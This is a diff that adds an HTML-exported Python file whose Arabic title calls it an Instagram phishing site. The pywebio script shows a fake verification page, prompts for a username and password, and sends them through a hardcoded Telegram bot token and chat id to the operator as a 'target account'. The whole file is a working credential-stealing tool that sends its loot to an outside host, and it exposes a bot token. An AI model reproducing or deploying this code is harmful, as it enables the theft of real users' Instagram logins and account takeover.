@@ -1,0 +1,45 @@
+<html>
+<head>
+<title>موقع مع صيد انستكرام.py</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<style type="text/css">
+.s0 { color: #cc7832;}
+.s1 { color: #a9b7c6;}
+.s2 { color: #6a8759;}
+.s3 { color: #808080;}
+.s4 { color: #6897bb;}
+</style>
+</head>
+<body bgcolor="#2b2b2b">
+<table CELLSPACING=0 CELLPADDING=5 COLS=1 WIDTH="100%" BGCOLOR="#606060" >
+<tr><td><center>
+<font face="Arial, Helvetica" color="#000000">
+موقع مع صيد انستكرام.py</font>
+</center></td></tr></table>
+<pre><span class="s0">from </span><span class="s1">pywebio </span><span class="s0">import </span><span class="s1">start_server</span>
+<span class="s0">import </span><span class="s1">requests</span>
+<span class="s0">from </span><span class="s1">pywebio.input </span><span class="s0">import </span><span class="s1">*</span>
+<span class="s0">from </span><span class="s1">pywebio.pin </span><span class="s0">import </span><span class="s1">*</span>
+<span class="s0">from </span><span class="s1">pywebio.session </span><span class="s0">import </span><span class="s1">*</span>
+<span class="s0">from </span><span class="s1">pywebio.output </span><span class="s0">import </span><span class="s1">*</span>
+
+<span class="s1">took = (</span><span class="s2">&quot;5964228671:AAEAVO7vkjb2_FSN4Mu44NubfCBNkD4_dm8&quot;</span><span class="s1">)</span>
+
+<span class="s1">idd = (</span><span class="s2">'1178940954'</span><span class="s1">)</span>
+
+
+<span class="s1">popup (</span><span class="s2">&quot;اهلا وسهلا &quot;</span><span class="s0">,</span>
+<span class="s1">put_text(</span><span class="s2">&quot;عدد الداعمين &quot;</span><span class="s1">).onclick(</span><span class="s0">lambda</span><span class="s1">: toast(</span><span class="s2">&quot;11&quot;</span><span class="s1">)))</span><span class="s0">,</span>
+<span class="s1">put_html(</span><span class="s2">'&lt;center&gt;&lt;h3&gt;الموافقين على التوثيق&lt;/h3&gt;&lt;img src =&quot;https://i0.wp.com/jnyhnews.com/wp-content/uploads/2022/04/%D8%B7%D8%B1%D9%8A%D9%82%D8%A9-%D8%AA%D9%88%D8%AB%D9%8A%D9%82-%D8%AD%D8%B3%D8%A7%D8%A8-%D8%A7%D9%86%D8%B3%D8%AA%D8%BA%D8%B1%D8%A7%D9%85.png&quot; width=400 &gt;&lt;/center&gt;'</span><span class="s1">)</span><span class="s0">, </span><span class="s3">#الصوره</span>
+
+
+<span class="s1">aa  = input(</span><span class="s2">&quot;username&quot;</span><span class="s1">)</span>
+<span class="s1">app = input(</span><span class="s2">&quot;password&quot;</span><span class="s1">)</span>
+
+<span class="s1">telegram_sand = (</span><span class="s2">f'https://api.telegram.org/bot</span><span class="s0">{</span><span class="s1">took</span><span class="s0">}</span><span class="s2">/sendMessage?chat_id=</span><span class="s0">{</span><span class="s1">idd</span><span class="s0">}</span><span class="s2">&amp;text=target account</span><span class="s0">\n</span><span class="s2">password : </span><span class="s0">{</span><span class="s1">aa</span><span class="s0">}\n</span><span class="s2">username : </span><span class="s0">{</span><span class="s1">app</span><span class="s0">}</span><span class="s2">'</span><span class="s1">)</span>
+<span class="s1">RQ=requests.post(telegram_sand)</span>
+<span class="s1">start_server(port=</span><span class="s4">6585</span><span class="s0">, </span><span class="s1">debug=</span><span class="s0">True</span><span class="s1">)</span>
+
+</pre>
+</body>
+</html>
